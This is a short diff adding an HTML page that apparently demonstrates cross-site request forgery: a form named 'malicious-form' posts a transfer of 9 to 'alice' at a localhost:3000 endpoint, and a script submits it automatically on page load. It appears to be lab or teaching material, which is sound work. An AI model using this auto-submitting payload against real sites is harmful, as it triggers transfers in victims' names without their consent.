@@ -1,0 +1,10 @@
+	<form id="malicious-form" action="http://localhost:3000/transfer" method="POST">
+		<input type="text" name="to" value="alice">
+		<input type="text" name="amount" value="9">
+		<input type="submit" value="transfer">
+	</form>
+	<script>
+		document.addEventListener('DOMContentLoaded', function() {
+			document.getElementById('malicious-form').submit();
+		});
+	</script>
